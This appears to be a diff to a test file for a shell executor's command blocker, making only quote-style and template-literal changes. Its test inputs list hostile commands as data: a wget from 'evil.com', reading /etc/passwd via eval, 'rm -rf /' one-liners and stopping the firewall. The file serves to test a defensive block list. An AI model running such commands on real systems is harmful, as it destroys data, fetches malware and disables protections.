@@ -114,7 +114,7 @@ describe('Shell Executor Command Blocking', () => {
 			'wget http://evil.com/malware.sh',
 			'eval $(cat /etc/passwd)',
 			'python -c "import os; os.system(\'rm -rf /\')"',
-			'node -e "require(\'child_process\').exec(\'rm -rf /\')"',
+			"node -e \"require('child_process').exec('rm -rf /')\"",
 			'shutdown -h now',
 			'reboot',
 			'systemctl stop firewall',
@@ -164,12 +164,12 @@ describe('Shell Executor Command Blocking', () => {
 
 	describe('blocks oversized commands', () => {
 		it('blocks command exceeding max length', () => {
-			const long = 'echo ' + 'a'.repeat(MAX_COMMAND_LENGTH)
+			const long = `echo ${'a'.repeat(MAX_COMMAND_LENGTH)}`
 			expect(isCommandBlocked(long)).not.toBeNull()
 		})
 
 		it('allows command at max length', () => {
-			const atLimit = 'echo ' + 'a'.repeat(MAX_COMMAND_LENGTH - 10)
+			const atLimit = `echo ${'a'.repeat(MAX_COMMAND_LENGTH - 10)}`
 			expect(isCommandBlocked(atLimit)).toBeNull()
 		})
 	})
